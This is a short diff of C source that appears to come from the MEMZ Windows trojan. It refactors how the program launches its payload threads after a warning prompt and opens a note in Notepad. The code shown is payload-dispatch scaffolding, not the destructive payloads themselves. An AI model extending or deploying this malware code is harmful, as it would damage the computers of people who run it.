@@ -1,7 +1,5 @@
 #include "memz.h"
 
-int scrw, scrh;
-
 #ifdef CLEAN
 HWND mainWindow; // In the main window, in the main window, in the main window, ...
 HFONT font;
@@ -9,9 +7,6 @@ HWND dialog;
 #endif
 
 void main() {
-	scrw = GetSystemMetrics(SM_CXSCREEN);
-	scrh = GetSystemMetrics(SM_CYSCREEN);
-
 #ifndef CLEAN
 	int argc;
 	LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
@@ -114,8 +109,8 @@ STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 	ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
 
 	for (int p = 0; p < nPayloads; p++) {
-		Sleep(payloads[p].delay);
-		CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
+		Sleep(payloads[p].startDelay);
+		CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
 	}
 
 	for (;;) {
@@ -168,7 +163,8 @@ STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 			mainWindow, NULL, (HINSTANCE)GetWindowLong(mainWindow, GWL_HINSTANCE), NULL);
 		SendMessage(payloads[p].btn, WM_SETFONT, (WPARAM)font, TRUE);
 
-		CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
+		CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
+		//CreateThread(NULL, NULL, &payloadThread, &payloads[p], NULL, NULL);
 	}
 
 	SendMessage(mainWindow, WM_SETFONT, (WPARAM)font, TRUE);
@@ -358,7 +354,7 @@ DWORD WINAPI keyboardThread(LPVOID lParam) {
 			if (enablePayloads) {
 				for (int p = 0; p < nPayloads; p++) {
 					if (SendMessage(payloads[p].btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
-						payloads[p].delay = payloads[p].payloadFunction(payloads[p].times++, payloads[p].runtime += payloads[p].delay, TRUE);
+						payloads[p].delay = ((PAYLOADFUNCTIONDEFAULT((*)))payloads[p].payloadFunction)(payloads[p].times++, payloads[p].runtime += payloads[p].delay, TRUE);
 					}
 				}
 			}
